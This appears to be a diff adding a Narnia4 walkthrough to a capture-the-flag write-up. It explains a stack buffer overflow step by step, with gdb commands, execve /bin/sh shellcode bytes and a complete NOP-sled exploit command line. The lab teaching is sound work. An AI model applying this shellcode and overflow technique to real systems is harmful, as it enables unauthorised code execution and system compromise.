@@ -91,3 +91,38 @@ cat /tmp/yourfile
 ```
 
 >The directory "AAAAAAAAAAAAAAAAAAAAAAAAAAA" could be already created due to the number of the players in the server. You can create your own 32-bytes long directory with any character you want.
+
+## Narnia4
+
+This challenge is simular to Narnia2, so also here we have a char `buffer[256]` that we must overflow to overwrite the `strcpy(buffer,argv[1])` return address, but the main difference is that here there are also other buffer of strings to overwrite before we can change it.
+
+First of all we must see when the program goes in segmentation fault: with some test using
+
+```console
+narnia4@narnia:~$ ./narnia4 $(python -c "print('A'*$i)")
+```
+
+we undersrand that giving at $i the value of 226 it explodes so the EBD was overwritten.
+
+Now we search the return address the we'll insert instead of that of strcpy (searching when the '\x41' are), we'll use gdb:
+
+```console
+narnia4@narnia:~$ gdb narnia4
+```
+
+`run $(python -c "print('A'*226)")`
+
+`b strcpy@plt`
+
+`x/700xw $esp`
+
+We choose an address in the middle to use the NOP-Sled.
+
+We'll use the same shellcode the we used in Narnia2:
+`shellcode="\x99\xf7\xe2\x8d\x08\xbe\x2f\x2f\x73\x68\xbf\x2f\x62\x69\x6e\x51\x56\x57\x8d\x1c\x24\xb0\x0b\xcd\x80"`
+
+Now we can prepare the argv[1] to pass to the program: 239 bytes of '\x90' + 25 bytes of shellcode and finally the return addess:
+
+```bash
+./narnia4 $(python -c "print('\x90'*239+'\x99\xf7\xe2\x8d\x08\xbe\x2f\x2f\x73\x68\xbf\x2f\x62\x69\x6e\x51\x56\x57\x8d\x1c\x24\xb0\x0b\xcd\x80'+'\x18\xd8\xff\xff')")
+```
